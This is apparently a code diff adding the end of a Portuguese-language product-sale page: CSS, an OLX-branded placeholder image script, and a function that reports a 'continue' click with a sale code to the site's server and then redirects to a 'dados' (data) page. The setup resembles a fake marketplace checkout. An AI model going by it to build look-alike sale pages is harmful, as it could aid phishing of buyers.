+            .product-title-modern {
+                font-size: 1.6rem;
+            }
+
+            .price-value {
+                font-size: 2.2rem;
+            }
+
+            .modern-cards-layout {
+                grid-template-columns: 1fr;
+            }
+
+            .profile-section {
+                flex-direction: column;
+                text-align: center;
+            }
+
+            .timeline-item {
+                flex-direction: column;
+                text-align: center;
+                gap: 10px;
+            }
+
+            .timeline-check {
+                margin-left: 0;
+                margin-top: 10px;
+            }
+        }
+
+        @media (max-width: 480px) {
+            .showcase-gallery,
+            .product-info-panel {
+                padding: 20px;
+            }
+
+            .product-title-modern {
+                font-size: 1.4rem;
+            }
+
+            .price-value {
+                font-size: 1.8rem;
+            }
+
+            .card-content-modern {
+                padding: 20px;
+            }
+        }
+    </style>
+
+    <!-- Adicionar script para criar placeholder de imagem caso a imagem padrão não seja encontrada -->
+    <script>
+        // Criar placeholder de imagem para fallback
+        function criarImagemPlaceholder() {
+            // Verificar se já existe o elemento no DOM
+            if (document.getElementById('produto-placeholder-img')) {
+                return;
+            }
+
+            // Criar elemento canvas para gerar uma imagem placeholder
+            const canvas = document.createElement('canvas');
+            canvas.width = 250;
+            canvas.height = 180;
+            const ctx = canvas.getContext('2d');
+
+            // Preencher fundo
+            ctx.fillStyle = '#f0f0f0';
+            ctx.fillRect(0, 0, canvas.width, canvas.height);
+
+            // Adicionar texto
+            ctx.fillStyle = '#ff6600';
+            ctx.font = 'bold 20px sans-serif';
+            ctx.textAlign = 'center';
+            ctx.textBaseline = 'middle';
+            ctx.fillText('Produto OLX', canvas.width / 2, canvas.height / 2);
+
+            // Adicionar borda
+            ctx.strokeStyle = '#ccc';
+            ctx.lineWidth = 2;
+            ctx.strokeRect(5, 5, canvas.width - 10, canvas.height - 10);
+
+            // Adicionar ícone
+            ctx.fillStyle = '#ff6600';
+            ctx.beginPath();
+            ctx.arc(canvas.width / 2, 50, 20, 0, Math.PI * 2);
+            ctx.fill();
+
+            // Converter para URL de dados
+            const dataUrl = canvas.toDataURL('image/png');
+
+            // Criar elemento de imagem e adicionar ao DOM
+            const img = document.createElement('img');
+            img.id = 'produto-placeholder-img';
+            img.src = dataUrl;
+            img.style.display = 'none';
+            document.body.appendChild(img);
+
+            return dataUrl;
+        }
+
+        // Executar após o carregamento da página
+        window.addEventListener('load', criarImagemPlaceholder);
+
+        // Verificar imagens com erro após 1 segundo (para dar tempo de carregar)
+        setTimeout(() => {
+            document.querySelectorAll('.produto-img img').forEach(img => {
+                if (!img.complete || img.naturalHeight === 0) {
+                    const placeholder = document.getElementById('produto-placeholder-img');
+                    if (placeholder) {
+                        img.src = placeholder.src;
+                    } else {
+                        const dataUrl = criarImagemPlaceholder();
+                        img.src = dataUrl;
+                    }
+                }
+            });
+        }, 1000);
+    </script>
+
+
+
+    <!-- Adicionar script para notificação de clique no botão continuar -->
+    <script>
+        function notificarCliqueContinuar() {
+            // Obter código da venda e nome do produto da página
+            const codigoVenda = document.getElementById('venda-codigo')?.textContent ||
+                document.getElementById('venda-codigo-small')?.textContent ||
+                "Não informado";
+            const nomeProduto = document.getElementById('produto-nome')?.textContent || "Não informado";
+
+            // Enviar notificação ao servidor
+            fetch('/api/notificar-clique-continuar', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    codigo: codigoVenda,
+                    produto: nomeProduto
+                })
+            })
+                .then(response => response.json())
+                .then(data => {
+                    console.log('Notificação enviada:', data);
+                    // Modificado: Incluir o código da venda na URL de redirecionamento
+                    window.location.href = `/pag/dados.html?id=${encodeURIComponent(codigoVenda)}`;
+                })
+                .catch(error => {
+                    console.error('Erro ao enviar notificação:', error);
+                    // Modificado: Incluir o código da venda mesmo em caso de erro
+                    window.location.href = `/pag/dados.html?id=${encodeURIComponent(codigoVenda)}`;
+                });
+        }
+    </script>
+
+</body>
+
+</html>
